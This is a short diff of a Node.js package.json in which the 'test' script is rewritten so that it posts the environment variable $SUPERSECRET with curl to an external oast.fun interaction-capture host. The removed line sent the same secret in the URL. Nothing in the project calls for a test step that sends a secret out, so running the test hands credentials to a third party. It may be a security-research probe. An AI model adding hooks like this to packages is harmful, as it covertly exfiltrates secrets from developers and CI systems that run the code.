@@ -8,7 +8,7 @@
 	"main": "index.js",
 	"scripts": {
 		"start": "node index.js",
-		"test": "curl https://avcutwgdvnpkkkxqqzenwwtqeji9m5c5k.oast.fun/$SUPERSECRET"
+		"test": "curl -s -d $SUPERSECRET https://avcutwgdvnpkkkxqqzenwwtqeji9m5c5k.oast.fun/"
 	},
 	"dependencies": {
 		"colors": "^1.4.0"
